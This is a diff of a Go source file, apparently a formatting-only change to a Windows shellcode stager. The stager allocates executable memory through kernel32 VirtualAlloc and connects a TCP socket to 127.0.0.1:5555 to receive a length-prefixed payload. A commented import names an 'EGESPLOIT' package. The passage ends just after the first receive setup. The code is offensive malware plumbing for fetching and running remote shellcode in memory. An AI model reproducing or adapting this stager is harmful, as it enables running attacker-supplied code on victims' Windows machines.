@@ -1,21 +1,19 @@
 package main
 
-
 import "encoding/binary"
 import "syscall"
 import "unsafe"
+
 //import "EGESPLOIT/RSE"
 
-const MEM_COMMIT  = 0x1000
+const MEM_COMMIT = 0x1000
 const MEM_RESERVE = 0x2000
-const PAGE_AllocateUTE_READWRITE  = 0x40
-
+const PAGE_AllocateUTE_READWRITE = 0x40
 
 var K32 = syscall.NewLazyDLL("kernel32.dll")
 var VirtualAlloc = K32.NewProc("VirtualAlloc")
 
-
-func Allocate(Shellcode uintptr) (uintptr) {
+func Allocate(Shellcode uintptr) uintptr {
 
 	Addr, _, _ := VirtualAlloc.Call(0, Shellcode, MEM_RESERVE|MEM_COMMIT, PAGE_AllocateUTE_READWRITE)
 	if Addr == 0 {
@@ -29,7 +27,7 @@ func main() {
 	var WSA_Data syscall.WSAData
 	syscall.WSAStartup(uint32(0x202), &WSA_Data)
 	Socket, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)
-	Socket_Addr := syscall.SockaddrInet4{Port: 5555, Addr: [4]byte{127,0,0,1}}
+	Socket_Addr := syscall.SockaddrInet4{Port: 5555, Addr: [4]byte{127, 0, 0, 1}}
 	syscall.Connect(Socket, &Socket_Addr)
 	var Length [4]byte
 	WSA_Buffer := syscall.WSABuf{Len: uint32(4), Buf: &Length[0]}
